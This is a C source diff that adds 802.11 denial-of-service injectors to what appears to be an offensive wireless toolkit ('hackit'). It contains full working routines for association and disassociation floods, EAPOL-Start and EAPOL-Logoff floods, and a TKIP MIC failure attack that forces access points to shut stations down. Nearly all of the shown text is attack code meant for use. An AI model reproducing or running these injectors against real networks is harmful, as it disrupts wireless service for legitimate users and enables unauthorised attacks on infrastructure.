@@ -793,3 +793,188 @@ int hackit_inject_beacon_flood(const char* iface, const char* ssids[],
     }
     return sent;
 }
+
+/* ─────────────────────────────────────────────────────────────
+ * Management-frame DoS injectors (assoc / disassoc / eapol /
+ * tkip-mic / mdk4-style). All follow the auth_flood shape:
+ * radiotap + 24-byte 802.11 mgmt header + body.
+ */
+static int inject_mgmt(const char* iface, const uint8_t* bssid,
+                       const uint8_t* sa, uint8_t type_subtype,
+                       const uint8_t* body, int body_len, int count,
+                       uint16_t reason_or_status) {
+    if (!iface || !bssid) return -1;
+#ifdef HACKIT_HAS_PCAP
+    uint8_t radiotap[HACKIT_80211_radiotap_LEN];
+    int rad_len = 0;
+    build_radiotap_header(radiotap, &rad_len);
+    int frame_len = rad_len + HACKIT_80211_MGMT_HDR_LEN + body_len;
+    uint8_t* frame = (uint8_t*)calloc(1, (size_t)frame_len);
+    if (!frame) return -1;
+    memcpy(frame, radiotap, rad_len);
+    uint8_t* mgmt = frame + rad_len;
+    mgmt[0] = type_subtype; mgmt[1] = 0x00;
+    mgmt[2] = 0x00; mgmt[3] = 0x00; /* duration */
+    memcpy(&mgmt[4], bssid, 6);              /* DA */
+    if (sa) memcpy(&mgmt[10], sa, 6); else memcpy(&mgmt[10], bssid, 6); /* SA */
+    memcpy(&mgmt[16], bssid, 6);             /* BSSID */
+    mgmt[22] = (uint8_t)(reason_or_status & 0xFF);
+    mgmt[23] = (uint8_t)((reason_or_status >> 8) & 0xFF);
+    if (body && body_len > 0) memcpy(&mgmt[24], body, (size_t)body_len);
+    pcap_t* handle = open_pcap_for_inject(iface);
+    if (!handle) { free(frame); return -1; }
+    int sent = 0;
+    for (int i = 0; i < count; i++) {
+        if (pcap_inject(handle, frame, frame_len) == frame_len) sent++;
+        else hackit_usleep(100);
+    }
+    close_pcap_for_inject(handle);
+    free(frame);
+    return sent;
+#else
+    (void)bssid; (void)sa; (void)type_subtype; (void)body; (void)body_len;
+    (void)count; (void)reason_or_status;
+    fprintf(stderr, "[INJECT] pcap not available.\n");
+    return -1;
+#endif
+}
+
+/* Assoc request flood — frame type 0x00 (assoc req). Body = 4 bytes cap+listen. */
+int hackit_inject_assoc_flood(const char* iface, const uint8_t* bssid, int count) {
+    if (!iface || !bssid || count <= 0) return -1;
+    uint8_t body[4] = { 0x01, 0x00, 0x0A, 0x00 }; /* ESS + listen interval 10 */
+    return inject_mgmt(iface, bssid, NULL, 0x00, body, sizeof(body), count, 0);
+}
+
+/* Disassoc flood — frame type 0x0A (disassociation). */
+int hackit_inject_disassoc_flood(const char* iface, const uint8_t* bssid, int count, uint16_t reason) {
+    if (!iface || !bssid || count <= 0) return -1;
+    return inject_mgmt(iface, bssid, NULL, 0x0A, NULL, 0, count, reason);
+}
+
+/* EAPOL-Start flood — snap + ethertype 0x888e + 4-byte body. Sent as
+ * data frame (type 0x08, subtype 0x00). The mgmt injector can't carry
+ * 802.1X, so we craft the full 802.11 data frame manually. */
+int hackit_inject_eapol_start_flood(const char* iface, const uint8_t* bssid, int count) {
+    if (!iface || !bssid || count <= 0) return -1;
+#ifdef HACKIT_HAS_PCAP
+    uint8_t radiotap[HACKIT_80211_radiotap_LEN];
+    int rad_len = 0;
+    build_radiotap_header(radiotap, &rad_len);
+    /* 802.11 data header (24) + LLC/SNAP (8) + EAPOL-Start body (4) */
+    uint8_t snap[] = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E };
+    uint8_t eapol_start[] = { 0x02, 0x01, 0x00, 0x00 };
+    int body_len = (int)(sizeof(snap) + sizeof(eapol_start));
+    int frame_len = rad_len + 24 + body_len;
+    uint8_t* frame = (uint8_t*)calloc(1, (size_t)frame_len);
+    if (!frame) return -1;
+    memcpy(frame, radiotap, rad_len);
+    uint8_t* hdr = frame + rad_len;
+    hdr[0] = 0x08; hdr[1] = 0x01; /* data, ToDS=0 FromDS=1 */
+    hdr[2] = 0x00; hdr[3] = 0x00;
+    memcpy(&hdr[4], bssid, 6);
+    memcpy(&hdr[10], bssid, 6);
+    memcpy(&hdr[16], bssid, 6);
+    hdr[22] = 0x00; hdr[23] = 0x00;
+    memcpy(&hdr[24], snap, sizeof(snap));
+    memcpy(&hdr[24 + sizeof(snap)], eapol_start, sizeof(eapol_start));
+    pcap_t* handle = open_pcap_for_inject(iface);
+    if (!handle) { free(frame); return -1; }
+    int sent = 0;
+    for (int i = 0; i < count; i++) {
+        if (pcap_inject(handle, frame, frame_len) == frame_len) sent++;
+        else hackit_usleep(100);
+    }
+    close_pcap_for_inject(handle);
+    free(frame);
+    return sent;
+#else
+    (void)count;
+    fprintf(stderr, "[INJECT] pcap not available.\n");
+    return -1;
+#endif
+}
+
+/* EAPOL-Logoff — like start but body type 0x02 (logoff). */
+int hackit_inject_eapol_logoff_flood(const char* iface, const uint8_t* bssid, int count) {
+    if (!iface || !bssid || count <= 0) return -1;
+#ifdef HACKIT_HAS_PCAP
+    uint8_t radiotap[HACKIT_80211_radiotap_LEN];
+    int rad_len = 0;
+    build_radiotap_header(radiotap, &rad_len);
+    uint8_t snap[] = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E };
+    uint8_t eapol_logoff[] = { 0x02, 0x02, 0x00, 0x00 };
+    int body_len = (int)(sizeof(snap) + sizeof(eapol_logoff));
+    int frame_len = rad_len + 24 + body_len;
+    uint8_t* frame = (uint8_t*)calloc(1, (size_t)frame_len);
+    if (!frame) return -1;
+    memcpy(frame, radiotap, rad_len);
+    uint8_t* hdr = frame + rad_len;
+    hdr[0] = 0x08; hdr[1] = 0x01;
+    hdr[2] = 0x00; hdr[3] = 0x00;
+    memcpy(&hdr[4], bssid, 6);
+    memcpy(&hdr[10], bssid, 6);
+    memcpy(&hdr[16], bssid, 6);
+    hdr[22] = 0x00; hdr[23] = 0x00;
+    memcpy(&hdr[24], snap, sizeof(snap));
+    memcpy(&hdr[24 + sizeof(snap)], eapol_logoff, sizeof(eapol_logoff));
+    pcap_t* handle = open_pcap_for_inject(iface);
+    if (!handle) { free(frame); return -1; }
+    int sent = 0;
+    for (int i = 0; i < count; i++) {
+        if (pcap_inject(handle, frame, frame_len) == frame_len) sent++;
+        else hackit_usleep(100);
+    }
+    close_pcap_for_inject(handle);
+    free(frame);
+    return sent;
+#else
+    (void)count;
+    fprintf(stderr, "[INJECT] pcap not available.\n");
+    return -1;
+#endif
+}
+
+/* TKIP MIC / Michael DoS — sends a QoS-data frame with garbage that
+ * triggers two MIC failures in a row, forcing the AP to shut the
+ * station down for 60 s (the classic mdk4 "m" behaviour). */
+int hackit_inject_tkip_mic(const char* iface, const uint8_t* bssid,
+                           const uint8_t* station, int count) {
+    if (!iface || !bssid || count <= 0) return -1;
+#ifdef HACKIT_HAS_PCAP
+    uint8_t radiotap[HACKIT_80211_radiotap_LEN];
+    int rad_len = 0;
+    build_radiotap_header(radiotap, &rad_len);
+    /* QoS data frame header 26 bytes + 64 bytes garbage payload */
+    int body_len = 64;
+    int frame_len = rad_len + 26 + body_len;
+    uint8_t* frame = (uint8_t*)calloc(1, (size_t)frame_len);
+    if (!frame) return -1;
+    memcpy(frame, radiotap, rad_len);
+    uint8_t* hdr = frame + rad_len;
+    hdr[0] = 0x88; hdr[1] = 0x01; /* QoS data, ToDS=0 FromDS=1 */
+    hdr[2] = 0x00; hdr[3] = 0x00;
+    memcpy(&hdr[4], station ? station : bssid, 6);
+    memcpy(&hdr[10], bssid, 6);
+    memcpy(&hdr[16], bssid, 6);
+    hdr[22] = 0x00; hdr[23] = 0x00;
+    hdr[24] = 0x00; hdr[25] = 0x00; /* QoS control */
+    uint8_t* payload = &hdr[26];
+    for (int i = 0; i < body_len; i++) payload[i] = (uint8_t)(i * 37 + 11);
+    pcap_t* handle = open_pcap_for_inject(iface);
+    if (!handle) { free(frame); return -1; }
+    int sent = 0;
+    for (int i = 0; i < count; i++) {
+        if (pcap_inject(handle, frame, frame_len) == frame_len) sent++;
+        else hackit_usleep(100);
+        hackit_usleep(500);
+    }
+    close_pcap_for_inject(handle);
+    free(frame);
+    return sent;
+#else
+    (void)bssid; (void)station; (void)count;
+    fprintf(stderr, "[INJECT] pcap not available.\n");
+    return -1;
+#endif
+}
